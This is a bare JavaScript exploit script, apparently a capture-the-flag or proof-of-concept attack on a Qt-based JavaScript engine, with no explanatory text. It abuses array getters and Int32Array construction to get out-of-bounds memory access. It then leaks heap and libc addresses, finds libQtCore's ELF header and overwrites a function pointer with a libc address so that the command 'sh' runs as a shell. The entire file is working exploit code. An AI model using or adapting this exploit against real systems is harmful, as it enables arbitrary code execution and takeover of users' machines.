var a = [];
var x = Array(-2147483648/-1).concat(Int32Array);
var y = null, z = null, array = [], base = [0, 0], heap = [0, 0], libc_base = [0, 0];
// le32 unpacked command: \n\n\n\nsh\x00\x00
var cmd = [0x0a0a0a0a, 0x6873];
var i;
var offset = 0x693020;
x.__defineGetter__(0, function() {
	y = new Int32Array(0x100);
	z = new Int32Array(0x100);
})
for(i = 1; i < 10000; i+=2) {
	x[i+1] = 0xfffffff8;
	x[i] = 0xffffffff;
}

function resolve(x) {
}

x.__defineGetter__(80, function() {
	// while(1);
	// y[0x112] = offset_low;
	// y[0x113] = offset_high;
	for(i = 0; ; i++) {
		if(y[i] == 0x18) {
			break;
		}
	}
	y[i] = -8;
	y[i+1] = -1;
	// find heap pointer
	while(1) {
		y[0x112] -= 8;
		if((z[0] & 0xfff) === 2 && (z[1] & 0xfffe) === 0x2718)
			break;
	}
	y[0x112] -= 8;
	console.log(z[0].toString(16));
	console.log(z[1].toString(16));
	heap[0] = z[0];
	heap[1] = z[1];
	while(1) {
		y[0x112] -= 8;
		if((z[1] & 0xfffe) === 0x7ffe) {
			console.log(z[1].toString(16), z[0].toString(16));
		}
		if((z[0] & 0xfff) === 0xbe0 && (z[1] & 0xff00) === 0x7f00 && (z[2] & 0xfff) === 0x20)
			break;
	}
	libc_base[0] = z[0]-0x1bfbe0;
	libc_base[1] = z[1];
	console.log(z[0].toString(16));
	console.log(z[1].toString(16));
	y[0x112] -= 8;
	while(1) {
		y[0x112] -= 8;
		if((z[0] & 0xfff) === 0xa58 && (z[1] & 0xff00) === 0x7f00 && (z[2] & 0xfff) === 0x8d0)
			break;
	}
	// libQtCore - partial relro
	base[0] = z[0];
	base[1] = z[1];
	console.log(z[0].toString(16));
	console.log(z[1].toString(16));
	y[0x112] = (base[0] - heap[0]) & ~0xfff;
	y[0x113] = base[1] - heap[1];
	while(1) {
		y[0x112] -= 8;
		if(z[0] == 0x464c457f) {
			break;
		}
	}
	y[0x112] += offset;
	y.set(cmd, 16);
	z[0] = libc_base[0]+0x45380;
	z[1] = libc_base[1];
	console.log(z[0].toString(16));
	console.log(z[1].toString(16));
	y.set(z,0);
	// lol;
	y[0x41414141]=1;
})
new Int32Array( x);

